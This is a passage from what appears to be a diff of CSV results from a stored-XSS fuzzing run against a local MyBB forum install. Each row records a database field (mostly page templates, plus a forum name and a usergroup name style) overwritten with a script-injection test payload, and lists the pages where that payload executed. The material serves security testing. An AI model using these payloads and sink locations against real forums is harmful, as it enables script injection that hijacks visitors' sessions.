+http://localhost/mybb/calendar.php?calendar=1",964674,"""'><script>xss(964674)</script>","
+            mybb.mybb_templates.template[52][2]
+            original row: [53, 'calendar_year_sel', '<option value=""{$year_sel}"">{$year_sel}</option>', -2, '1800', '', 1676537388]
+            fuzzed row: [53, 'calendar_year_sel', '""\'><script>xss(964674)</script>', -2, '1800', '', 1676537388]
+            change: '<option value=""{$year_sel}"">{$year_sel}</option>' => '""'><script>xss(964674)</script>'
+            
+fuzzed after scan 194 / 302
+found as XSS in scan 195 / 302"
+mybb,mybb_forums.name,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/archive/index.php
+http://localhost/mybb/archive/index.php?forum-1.html
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top",966350,"""'><script>xss(966350)</script>","
+            mybb.mybb_forums.name[0][1]
+            original row: [1, 'My Category', '', '', 'c', 0, '1', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            fuzzed row: [1, '""\'><script>xss(966350)</script>', '', '', 'c', 0, '1', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            change: 'My Category' => '""'><script>xss(966350)</script>'
+            
+fuzzed after scan 24 / 302
+found as XSS in scan 25 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/member.php?action=login,966612,"""'><script>xss(966612)</script>","
+            mybb.mybb_templates.template[201][2]
+            original row: [202, 'member_login', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->login}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<br />\n{$inline_errors}\n{$member_loggedin_notice}\n<form action=""member.php"" method=""post"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""2""><strong>{$lang->login}</strong></td>\n</tr>\n<tr>\n<td class=""trow1""><strong>{$lang->username}</strong></td>\n<td class=""trow1""><input type=""text"" class=""textbox"" name=""username"" size=""25"" style=""width: 200px;"" value=""{$username}"" /></td>\n</tr>\n<tr>\n<td class=""trow2""><strong>{$lang->password}</strong><br /><span class=""smalltext"">{$lang->pw_note}</span></td>\n<td class=""trow2""><input type=""password"" class=""textbox"" name=""password"" size=""25"" style=""width: 200px;"" value=""{$password}"" /> (<a href=""member.php?action=lostpw"">{$lang->lostpw_note}</a>)</td>\n</tr>\n<tr>\n<td class=""trow1"" colspan=""2"" align=""center""><label title=""{$lang->remember_me_desc}""><input type=""checkbox"" class=""checkbox"" name=""remember"" checked=""checked"" value=""yes"" /> {$lang->remember_me}</label></td>\n</tr>\n{$captcha}\n</table>\n<br />\n<div align=""center""><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->login}"" /></div>\n<input type=""hidden"" name=""action"" value=""do_login"" />\n<input type=""hidden"" name=""url"" value=""{$redirect_url}"" />\n<input name=""my_post_key"" type=""hidden"" value=""{$mybb->post_code}"" />\n</form>\n{$footer}\n</body>\n</html>', -2, '1816', '', 1676537388]
+            fuzzed row: [202, 'member_login', '""\'><script>xss(966612)</script>', -2, '1816', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->login}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<br />
+{$inline_errors}
+{$member_loggedin_notice}
+<form action=""member.php"" method=""post"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""2""><strong>{$lang->login}</strong></td>
+</tr>
+<tr>
+<td class=""trow1""><strong>{$lang->username}</strong></td>
+<td class=""trow1""><input type=""text"" class=""textbox"" name=""username"" size=""25"" style=""width: 200px;"" value=""{$username}"" /></td>
+</tr>
+<tr>
+<td class=""trow2""><strong>{$lang->password}</strong><br /><span class=""smalltext"">{$lang->pw_note}</span></td>
+<td class=""trow2""><input type=""password"" class=""textbox"" name=""password"" size=""25"" style=""width: 200px;"" value=""{$password}"" /> (<a href=""member.php?action=lostpw"">{$lang->lostpw_note}</a>)</td>
+</tr>
+<tr>
+<td class=""trow1"" colspan=""2"" align=""center""><label title=""{$lang->remember_me_desc}""><input type=""checkbox"" class=""checkbox"" name=""remember"" checked=""checked"" value=""yes"" /> {$lang->remember_me}</label></td>
+</tr>
+{$captcha}
+</table>
+<br />
+<div align=""center""><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->login}"" /></div>
+<input type=""hidden"" name=""action"" value=""do_login"" />
+<input type=""hidden"" name=""url"" value=""{$redirect_url}"" />
+<input name=""my_post_key"" type=""hidden"" value=""{$mybb->post_code}"" />
+</form>
+{$footer}
+</body>
+</html>' => '""'><script>xss(966612)</script>'
+            
+fuzzed after scan 198 / 302
+found as XSS in scan 199 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/forumdisplay.php?fid=1,966915,"""'><script>xss(966915)</script>","
+            mybb.mybb_templates.template[119][2]
+            original row: [120, 'forumdisplay_subforums', '<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""5"" align=""center""><strong>{$lang->sub_forums_in}</strong></td>\n</tr>\n<tr>\n<td class=""tcat"" width=""2%"">&nbsp;</td>\n<td class=""tcat"" width=""59%""><span class=""smalltext""><strong>{$lang->forumbit_forum}</strong></span></td>\n<td class=""tcat"" width=""7%"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_threads}</strong></span></td>\n<td class=""tcat"" width=""7%"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_posts}</strong></span></td>\n<td class=""tcat"" width=""15%"" align=""center""><span class=""smalltext""><strong>{$lang->forumbit_lastpost}</strong></span></td>\n</tr>\n{$forums}\n</table>\n<br />', -2, '120', '', 1676537388]
+            fuzzed row: [120, 'forumdisplay_subforums', '""\'><script>xss(966915)</script>', -2, '120', '', 1676537388]
+            change: '<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""5"" align=""center""><strong>{$lang->sub_forums_in}</strong></td>
+</tr>
+<tr>
+<td class=""tcat"" width=""2%"">&nbsp;</td>
+<td class=""tcat"" width=""59%""><span class=""smalltext""><strong>{$lang->forumbit_forum}</strong></span></td>
+<td class=""tcat"" width=""7%"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_threads}</strong></span></td>
+<td class=""tcat"" width=""7%"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_posts}</strong></span></td>
+<td class=""tcat"" width=""15%"" align=""center""><span class=""smalltext""><strong>{$lang->forumbit_lastpost}</strong></span></td>
+</tr>
+{$forums}
+</table>
+<br />' => '""'><script>xss(966915)</script>'
+            
+fuzzed after scan 195 / 302
+found as XSS in scan 196 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/contact.php
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top
+http://localhost/mybb/member.php?action=login
+http://localhost/mybb/member.php?action=lostpw
+http://localhost/mybb/member.php?action=register
+http://localhost/mybb/memberlist.php
+http://localhost/mybb/memberlist.php?action=search
+http://localhost/mybb/misc.php?action=help
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/online.php
+http://localhost/mybb/online.php#top
+http://localhost/mybb/online.php?action=today
+http://localhost/mybb/online.php?sortby=location
+http://localhost/mybb/online.php?sortby=time
+http://localhost/mybb/online.php?sortby=username
+http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top
+http://localhost/mybb/showteam.php",968992,"""'><script>xss(968992)</script>","
+            mybb.mybb_templates.template[64][2]
+            original row: [65, 'footer', '<debugstuff>\n\t</div>\n</div>\n<div id=""footer"">\n\t<div class=""upper"">\n\t\t<div class=""wrapper"">\n\t\t\t{$lang_select}\n\t\t\t{$theme_select}\n\t\t\t<ul class=""menu bottom_links"">\n\t\t\t\t{$showteamlink}\n\t\t\t\t{$contact_us}\n\t\t\t\t<li><a href=""{$mybb->settings[\'homeurl\']}"">{$mybb->settings[\'homename\']}</a></li>\n\t\t\t\t<li><a href=""#top"">{$lang->bottomlinks_returntop}</a></li>\n\t\t\t\t<li><a href=""<archive_url>"">{$lang->bottomlinks_litemode}</a></li>\n\t\t\t\t<li><a href=""{$mybb->settings[\'bburl\']}/misc.php?action=markread{$post_code_string}"">{$lang->bottomlinks_markread}</a></li>\n\t\t\t\t<li><a href=""{$mybb->settings[\'bburl\']}/misc.php?action=syndication"">{$lang->bottomlinks_syndication}</a></li>\n\t\t\t</ul>\n\t\t</div>\n\t</div>\n\t<div class=""lower"">\n\t\t<div class=""wrapper"">\n\t\t\t<span id=""current_time"">{$lang->welcome_current_time}</span>\n\t\t\t<span id=""copyright"">\n\t\t\t\t<!-- MyBB is free software developed and maintained by a volunteer community.\n\t\t\t\t\tIt would be much appreciated by the MyBB Group if you left the full copyright and ""powered by"" notice intact,\n\t\t\t\t\tto show your support for MyBB.  If you choose to remove or modify the copyright below,\n\t\t\t\t\tyou may be refused support on the MyBB Community Forums.\n\n\t\t\t\t\tThis is free software, support us and we\'ll support you. -->\n\t\t\t\t{$lang->powered_by} <a href=""https://mybb.com"" target=""_blank"" rel=""noopener"">MyBB{$mybbversion}</a>, &copy; 2002-{$copy_year} <a href=""https://mybb.com"" target=""_blank"" rel=""noopener"">MyBB Group</a>.\n\t\t\t\t<!-- End powered by -->\n\t\t\t</span>\n\t\t</div>\n\t</div>\n</div>\n<!-- The following piece of code allows MyBB to run scheduled tasks. DO NOT REMOVE -->{$task_image}<!-- End task image code -->\n{$auto_dst_detection}\n</div>', -2, '1820', '', 1676537388]
+            fuzzed row: [65, 'footer', '""\'><script>xss(968992)</script>', -2, '1820', '', 1676537388]
+            change: '<debugstuff>
+	</div>
+</div>
+<div id=""footer"">
+	<div class=""upper"">
+		<div class=""wrapper"">
+			{$lang_select}
+			{$theme_select}
+			<ul class=""menu bottom_links"">
+				{$showteamlink}
+				{$contact_us}
+				<li><a href=""{$mybb->settings['homeurl']}"">{$mybb->settings['homename']}</a></li>
+				<li><a href=""#top"">{$lang->bottomlinks_returntop}</a></li>
+				<li><a href=""<archive_url>"">{$lang->bottomlinks_litemode}</a></li>
+				<li><a href=""{$mybb->settings['bburl']}/misc.php?action=markread{$post_code_string}"">{$lang->bottomlinks_markread}</a></li>
+				<li><a href=""{$mybb->settings['bburl']}/misc.php?action=syndication"">{$lang->bottomlinks_syndication}</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class=""lower"">
+		<div class=""wrapper"">
+			<span id=""current_time"">{$lang->welcome_current_time}</span>
+			<span id=""copyright"">
+				<!-- MyBB is free software developed and maintained by a volunteer community.
+					It would be much appreciated by the MyBB Group if you left the full copyright and ""powered by"" notice intact,
+					to show your support for MyBB.  If you choose to remove or modify the copyright below,
+					you may be refused support on the MyBB Community Forums.
+
+					This is free software, support us and we'll support you. -->
+				{$lang->powered_by} <a href=""https://mybb.com"" target=""_blank"" rel=""noopener"">MyBB{$mybbversion}</a>, &copy; 2002-{$copy_year} <a href=""https://mybb.com"" target=""_blank"" rel=""noopener"">MyBB Group</a>.
+				<!-- End powered by -->
+			</span>
+		</div>
+	</div>
+</div>
+<!-- The following piece of code allows MyBB to run scheduled tasks. DO NOT REMOVE -->{$task_image}<!-- End task image code -->
+{$auto_dst_detection}
+</div>' => '""'><script>xss(968992)</script>'
+            
+fuzzed after scan 194 / 302
+found as XSS in scan 195 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/member.php?action=lostpw,969668,"""'><script>xss(969668)</script>","
+            mybb.mybb_templates.template[202][2]
+            original row: [203, 'member_lostpw', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->lost_pw}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n{$errors}\n<form action=""member.php"" method=""post"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""2""><strong>{$lang->lost_pw_form}</strong></td>\n</tr>\n<tr>\n<td class=""trow1"" width=""40%""><strong>{$lang->email_address}</strong></td>\n<td class=""trow1"" width=""60%""><input type=""text"" class=""textbox"" name=""email"" value=""{$email}"" /></td>\n</tr>\n{$captcha}\n</table>\n<br />\n<div align=""center""><input name=""submit"" type=""submit"" class=""button"" value=""{$lang->request_user_pass}"" /></div>\n<input type=""hidden"" name=""action"" value=""do_lostpw"" />\n</form>\n{$footer}\n</body>\n</html>', -2, '1821', '', 1676537388]
+            fuzzed row: [203, 'member_lostpw', '""\'><script>xss(969668)</script>', -2, '1821', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->lost_pw}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+{$errors}
+<form action=""member.php"" method=""post"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""2""><strong>{$lang->lost_pw_form}</strong></td>
+</tr>
+<tr>
+<td class=""trow1"" width=""40%""><strong>{$lang->email_address}</strong></td>
+<td class=""trow1"" width=""60%""><input type=""text"" class=""textbox"" name=""email"" value=""{$email}"" /></td>
+</tr>
+{$captcha}
+</table>
+<br />
+<div align=""center""><input name=""submit"" type=""submit"" class=""button"" value=""{$lang->request_user_pass}"" /></div>
+<input type=""hidden"" name=""action"" value=""do_lostpw"" />
+</form>
+{$footer}
+</body>
+</html>' => '""'><script>xss(969668)</script>'
+            
+fuzzed after scan 198 / 302
+found as XSS in scan 199 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/contact.php
+http://localhost/mybb/member.php?action=lostpw",974351,"""'><script>xss(974351)</script>","
+            mybb.mybb_templates.template[557][2]
+            original row: [558, 'post_captcha', '<tr id=""captcha_trow"">\n<td class=""trow1"" valign=""top"" width=""350""><strong>{$lang->image_verification}</strong>\n<br />\n<span class=""smalltext"">{$lang->verification_note}</span>\n</td>\n<td class=""trow1"">\n<script type=""text/javascript"">\n<!--\n\tlang.captcha_fetch_failure = ""{$lang->captcha_fetch_failure}"";\n// -->\n</script>\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/captcha.js?ver=1821""></script>\n<table style=""width: 300px; padding: 4px;"">\n\t<tr>\n\t\t<td style=""vertical-align: middle;""><img src=""{$mybb->settings[\'bburl\']}/captcha.php?imagehash={$imagehash}"" alt=""{$lang->image_verification}"" title=""{$lang->image_verification}"" id=""captcha_img"" /><br /><span style=""color: red;"" class=""smalltext"">{$lang->verification_subnote}</span>\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td>\n\t\t<input type=""text"" class=""textbox"" name=""imagestring"" value="""" id=""imagestring"" size=""16"" /><input type=""hidden"" name=""imagehash"" value=""{$imagehash}"" id=""imagehash"" />\n\t\t<script type=""text/javascript"">\n\t\t<!--\n\t\t\tif(use_xmlhttprequest == ""1"")\n\t\t\t{\n\t\t\t\tdocument.write(\'<input type=""button"" class=""button"" name=""refresh"" value=""{$lang->refresh}"" onclick=""return captcha.refresh();"" \\/>\');\n\t\t\t}\n\t\t// -->\n\t\t</script>\n\t\t</td>\n\t</tr>\n</table>\n</td>\n</tr>', -2, '1821', '', 1676537388]
+            fuzzed row: [558, 'post_captcha', '""\'><script>xss(974351)</script>', -2, '1821', '', 1676537388]
+            change: '<tr id=""captcha_trow"">
+<td class=""trow1"" valign=""top"" width=""350""><strong>{$lang->image_verification}</strong>
+<br />
+<span class=""smalltext"">{$lang->verification_note}</span>
+</td>
+<td class=""trow1"">
+<script type=""text/javascript"">
+<!--
+	lang.captcha_fetch_failure = ""{$lang->captcha_fetch_failure}"";
+// -->
+</script>
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/captcha.js?ver=1821""></script>
+<table style=""width: 300px; padding: 4px;"">
+	<tr>
+		<td style=""vertical-align: middle;""><img src=""{$mybb->settings['bburl']}/captcha.php?imagehash={$imagehash}"" alt=""{$lang->image_verification}"" title=""{$lang->image_verification}"" id=""captcha_img"" /><br /><span style=""color: red;"" class=""smalltext"">{$lang->verification_subnote}</span>
+		</td>
+	</tr>
+	<tr>
+		<td>
+		<input type=""text"" class=""textbox"" name=""imagestring"" value="""" id=""imagestring"" size=""16"" /><input type=""hidden"" name=""imagehash"" value=""{$imagehash}"" id=""imagehash"" />
+		<script type=""text/javascript"">
+		<!--
+			if(use_xmlhttprequest == ""1"")
+			{
+				document.write('<input type=""button"" class=""button"" name=""refresh"" value=""{$lang->refresh}"" onclick=""return captcha.refresh();"" \/>');
+			}
+		// -->
+		</script>
+		</td>
+	</tr>
+</table>
+</td>
+</tr>' => '""'><script>xss(974351)</script>'
+            
+fuzzed after scan 206 / 302
+found as XSS in scan 207 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/online.php?action=today,975839,"""'><script>xss(975839)</script>","
+            mybb.mybb_templates.template[519][2]
+            original row: [520, 'online_today', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->online_today}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead thead_left"" align=""center"" width=""50%""><span class=""smalltext""><strong>{$lang->on_username}</strong></span></td>\n<td class=""thead thead_right"" align=""center"" width=""50%""><span class=""smalltext""><strong>{$lang->time}</strong></span></td>\n</tr>\n{$todayrows}\n<tr>\n<td align=""center"" colspan=""2"" class=""trow1"" style=""white-space: nowrap"">{$onlinetoday}</td>\n</tr>\n</table>\n<br />\n{$multipage}\n{$footer}\n</body>\n</html>', -2, '1800', '', 1676537388]
+            fuzzed row: [520, 'online_today', '""\'><script>xss(975839)</script>', -2, '1800', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->online_today}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead thead_left"" align=""center"" width=""50%""><span class=""smalltext""><strong>{$lang->on_username}</strong></span></td>
+<td class=""thead thead_right"" align=""center"" width=""50%""><span class=""smalltext""><strong>{$lang->time}</strong></span></td>
+</tr>
+{$todayrows}
+<tr>
+<td align=""center"" colspan=""2"" class=""trow1"" style=""white-space: nowrap"">{$onlinetoday}</td>
+</tr>
+</table>
+<br />
+{$multipage}
+{$footer}
+</body>
+</html>' => '""'><script>xss(975839)</script>'
+            
+fuzzed after scan 205 / 302
+found as XSS in scan 206 / 302"
+mybb,mybb_usergroups.namestyle,http://localhost/mybb/showteam.php,977417,"""'><script>xss(977417)</script>","
+            mybb.mybb_usergroups.namestyle[1][4]
+            original row: [2, 1, 'Registered', 'After registration, all users are placed in this group by default.', '{username}', '', 0, 'images/star.png', '', 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 200, 5, 1, 0, 5, 5, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 5, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]
+            fuzzed row: [2, 1, 'Registered', 'After registration, all users are placed in this group by default.', '""\'><script>xss(977417)</script>', '', 0, 'images/star.png', '', 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 200, 5, 1, 0, 5, 5, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 5, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]
+            change: '{username}' => '""'><script>xss(977417)</script>'
+            
+fuzzed after scan 231 / 302
+found as XSS in scan 232 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2",980347,"""'><script>xss(980347)</script>","
+            mybb.mybb_templates.template[140][2]
+            original row: [141, 'forumdisplay_usersbrowsing', '<span class=""smalltext"">{$lang->users_browsing_forum} {$onlinemembers}{$onlinesep}{$invisonline}{$onlinesep2}{$guestsonline}</span><br />', -2, '1400', '', 1676537388]
+            fuzzed row: [141, 'forumdisplay_usersbrowsing', '""\'><script>xss(980347)</script>', -2, '1400', '', 1676537388]
+            change: '<span class=""smalltext"">{$lang->users_browsing_forum} {$onlinemembers}{$onlinesep}{$invisonline}{$onlinesep2}{$guestsonline}</span><br />' => '""'><script>xss(980347)</script>'
+            
+fuzzed after scan 195 / 302
+found as XSS in scan 196 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/member.php?action=emailuser&uid=
+http://localhost/mybb/member.php?action=profile&uid=
+http://localhost/mybb/stats.php
+http://localhost/mybb/stats.php#top",981253,"""'><script>xss(981253)</script>","
+            mybb.mybb_templates.template[59][2]
+            original row: [60, 'error', '<html>\n<head>\n<title>{$title}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<br />\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead""><span class=""smalltext""><strong>{$title}</strong></span></td>\n</tr>\n<tr>\n<td class=""trow1"">{$error}</td>\n</tr>\n</table>\n{$footer}\n</body>\n</html>', -2, '120', '', 1676537388]
+            fuzzed row: [60, 'error', '""\'><script>xss(981253)</script>', -2, '120', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$title}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<br />
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead""><span class=""smalltext""><strong>{$title}</strong></span></td>
+</tr>
+<tr>
+<td class=""trow1"">{$error}</td>
+</tr>
+</table>
+{$footer}
+</body>
+</html>' => '""'><script>xss(981253)</script>'
+            
+fuzzed after scan 194 / 302
+found as XSS in scan 195 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/forumdisplay.php?fid=2
+http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top",985479,"""'><script>xss(985479)</script>","
+            mybb.mybb_templates.template[963][2]
+            original row: [964, 'gobutton', '<input type=""submit"" class=""button"" value=""{$lang->go}"" />', -2, '120', '', 1676537388]
+            fuzzed row: [964, 'gobutton', '""\'><script>xss(985479)</script>', -2, '120', '', 1676537388]
+            change: '<input type=""submit"" class=""button"" value=""{$lang->go}"" />' => '""'><script>xss(985479)</script>'
+            
+fuzzed after scan 216 / 302
+found as XSS in scan 217 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/contact.php,988113,"""'><script>xss(988113)</script>","
+            mybb.mybb_templates.template[961][2]
+            original row: [962, 'contact', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->contact}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<form action=""contact.php"" method=""post"">\n\t<input type=""hidden"" name=""my_post_key"" value=""{$mybb->post_code}"" />\n\t<input type=""hidden"" name=""from"" value=""{$redirect_url}"" />\n\t{$errors}\n\t<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n\t\t<tr>\n\t\t<td class=""thead"" colspan=""2""><strong>{$lang->contact}</strong></td>\n\t\t</tr>\n\t\t<tr>\n\t\t<td class=""trow1"" valign=""top""><strong>{$lang->contact_subject}:</strong><br /><span class=""smalltext"">{$lang->contact_subject_desc}</span></td>\n\t\t<td class=""trow1""><input type=""text"" name=""subject"" class=""textbox"" size=""49"" value=""{$contact_subject}"" /></td>\n\t\t</tr>\n\t\t<tr>\n\t\t<td class=""trow2"" valign=""top""><strong>{$lang->contact_message}:</strong><br /><span class=""smalltext"">{$lang->contact_message_desc}</span></td>\n\t\t<td class=""trow2""><textarea cols=""50"" rows=""10"" name=""message"" class=""textarea"" >{$contact_message}</textarea></td>\n\t\t</tr>\n\t\t<tr>\n\t\t<td class=""trow1"" valign=""top""><strong>{$lang->contact_email}:</strong><br /><span class=""smalltext"">{$lang->contact_email_desc}</span></td>\n\t\t<td class=""trow1""><input type=""text"" name=""email"" class=""textbox"" size=""49"" value=""{$user_email}"" /></td>\n\t\t</tr>\n\t\t{$captcha}\n\t</table>\n\t<br />\n\t<div align=""center"">\n\t\t<input type=""submit"" class=""button"" name=""submit"" value=""{$lang->contact_send}"" />\n\t</div>\n</form>\n{$footer}\n</body>\n</html>', -2, '1827', '', 1676537388]
+            fuzzed row: [962, 'contact', '""\'><script>xss(988113)</script>', -2, '1827', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->contact}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<form action=""contact.php"" method=""post"">
+	<input type=""hidden"" name=""my_post_key"" value=""{$mybb->post_code}"" />
+	<input type=""hidden"" name=""from"" value=""{$redirect_url}"" />
+	{$errors}
+	<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+		<tr>
+		<td class=""thead"" colspan=""2""><strong>{$lang->contact}</strong></td>
+		</tr>
+		<tr>
+		<td class=""trow1"" valign=""top""><strong>{$lang->contact_subject}:</strong><br /><span class=""smalltext"">{$lang->contact_subject_desc}</span></td>
+		<td class=""trow1""><input type=""text"" name=""subject"" class=""textbox"" size=""49"" value=""{$contact_subject}"" /></td>
+		</tr>
+		<tr>
+		<td class=""trow2"" valign=""top""><strong>{$lang->contact_message}:</strong><br /><span class=""smalltext"">{$lang->contact_message_desc}</span></td>
+		<td class=""trow2""><textarea cols=""50"" rows=""10"" name=""message"" class=""textarea"" >{$contact_message}</textarea></td>
+		</tr>
+		<tr>
+		<td class=""trow1"" valign=""top""><strong>{$lang->contact_email}:</strong><br /><span class=""smalltext"">{$lang->contact_email_desc}</span></td>
+		<td class=""trow1""><input type=""text"" name=""email"" class=""textbox"" size=""49"" value=""{$user_email}"" /></td>
+		</tr>
+		{$captcha}
+	</table>
+	<br />
+	<div align=""center"">
+		<input type=""submit"" class=""button"" name=""submit"" value=""{$lang->contact_send}"" />
+	</div>
+</form>
+{$footer}
+</body>
+</html>' => '""'><script>xss(988113)</script>'
+            
+fuzzed after scan 216 / 302
+found as XSS in scan 217 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top",989457,"""'><script>xss(989457)</script>","
+            mybb.mybb_templates.template[175][2]
+            original row: [176, 'index', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']}</title>\n{$headerinclude}\n<script type=""text/javascript"">\n<!--\n\tlang.no_new_posts = ""{$lang->no_new_posts}"";\n\tlang.click_mark_read = ""{$lang->click_mark_read}"";\n// -->\n</script>\n</head>\n<body>\n{$header}\n{$forums}\n{$boardstats}\n\n<dl class=""forum_legend smalltext"">\n\t<dt><span class=""forum_status forum_on"" title=""{$lang->new_posts}""></span></dt>\n\t<dd>{$lang->new_posts}</dd>\n\n\t<dt><span class=""forum_status forum_off"" title=""{$lang->no_new_posts}""></span></dt>\n\t<dd>{$lang->no_new_posts}</dd>\n\n\t<dt><span class=""forum_status forum_offclose"" title=""{$lang->forum_closed}""></span></dt>\n\t<dd>{$lang->forum_closed}</dd>\n\n\t<dt><span class=""forum_status forum_offlink"" title=""{$lang->forum_redirect}""></span></dt>\n\t<dd>{$lang->forum_redirect}</dd>\n</dl>\n<br class=""clear"" />\n{$footer}\n</body>\n</html>', -2, '1817', '', 1676537388]
+            fuzzed row: [176, 'index', '""\'><script>xss(989457)</script>', -2, '1817', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']}</title>
+{$headerinclude}
+<script type=""text/javascript"">
+<!--
+	lang.no_new_posts = ""{$lang->no_new_posts}"";
+	lang.click_mark_read = ""{$lang->click_mark_read}"";
+// -->
+</script>
+</head>
+<body>
+{$header}
+{$forums}
+{$boardstats}
+
+<dl class=""forum_legend smalltext"">
+	<dt><span class=""forum_status forum_on"" title=""{$lang->new_posts}""></span></dt>
+	<dd>{$lang->new_posts}</dd>
+
+	<dt><span class=""forum_status forum_off"" title=""{$lang->no_new_posts}""></span></dt>
+	<dd>{$lang->no_new_posts}</dd>
+
+	<dt><span class=""forum_status forum_offclose"" title=""{$lang->forum_closed}""></span></dt>
+	<dd>{$lang->forum_closed}</dd>
+
+	<dt><span class=""forum_status forum_offlink"" title=""{$lang->forum_redirect}""></span></dt>
